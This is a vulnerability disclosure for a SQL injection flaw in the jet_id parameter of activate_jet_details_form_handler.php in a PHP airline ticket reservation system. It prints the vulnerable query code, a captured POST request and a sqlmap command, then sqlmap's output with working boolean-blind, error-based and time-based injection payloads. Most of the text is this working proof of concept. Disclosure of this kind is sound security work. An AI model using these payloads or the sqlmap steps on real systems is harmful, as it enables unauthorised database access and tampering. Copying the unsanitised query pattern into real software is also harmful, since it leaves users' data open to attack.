# Airline Ticket Reservation System - SQL Injection on (activate_jet_details_form_handler.php jet_id parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/13529/airline-ticket-reservation-system.html 

## Version:V1.0

## Tested on: PHP, Apache, MySQL

## Affected Page:
activate_jet_details_form_handler.php 

On this page, jet_id parameter is vulnerable to SQL Injection Attack 

## Source Code(airline-ticket-reservation/activate_jet_details_form_handler.php):
```
if(empty($_POST['jet_id']))
	{
		$data_missing[]='Jet ID';
	}
		else
	{
		$jet_id=trim($_POST['jet_id']);
	}
if(empty($data_missing)
	{
		require_once('Database Connection file/mysqli_connect.php');
		$query="UPDATE jet_details SET active='Yes' WHERE jet_id='{$jet_id}'";
}
```

## Proof of vulnerability(Verify using the sqlmap tool after logining):
### Requests:
POST /airline-ticket-reservation/activate_jet_details_form_handler.php HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

Content-Length: 123

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Language: zh-CN,zh;q=0.9

Cache-Control: max-age=0

Content-Type: application/x-www-form-urlencoded

Cookie: PHPSESSID=g883r0l08f296hfd9582abk9v0

Origin: http://localhost

Referer: http://localhost/airline-ticket-reservation/activate_jet_details.php

Upgrade-Insecure-Requests: 1

Accept-Encoding: gzip

Activate=Activate&jet_id=23412

### -> sqlmap -r 1.txt(above request package) --batch

## Output:

---

Parameter: jet_id (POST)

    Type: boolean-based blind
    
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    
    Payload: Activate=Activate&jet_id=23412%' RLIKE (SELECT (CASE WHEN (8181=8181) THEN 23412 ELSE 0x28 END)) AND 'zUez%'='zUez

    
    Type: error-based
    
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    
    Payload: Activate=Activate&jet_id=23412%' AND GTID_SUBSET(CONCAT(0x71766a7171,(SELECT (ELT(7316=7316,1))),0x716b707071),7316) AND 'rwcr%'='rwcr

    
    Type: time-based blind
    
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)
    
    Payload: Activate=Activate&jet_id=23412%' OR (SELECT 5838 FROM (SELECT(SLEEP(5)))fGPz)#
    
---
---

[07:33:07] [INFO] the back-end DBMS is MySQL

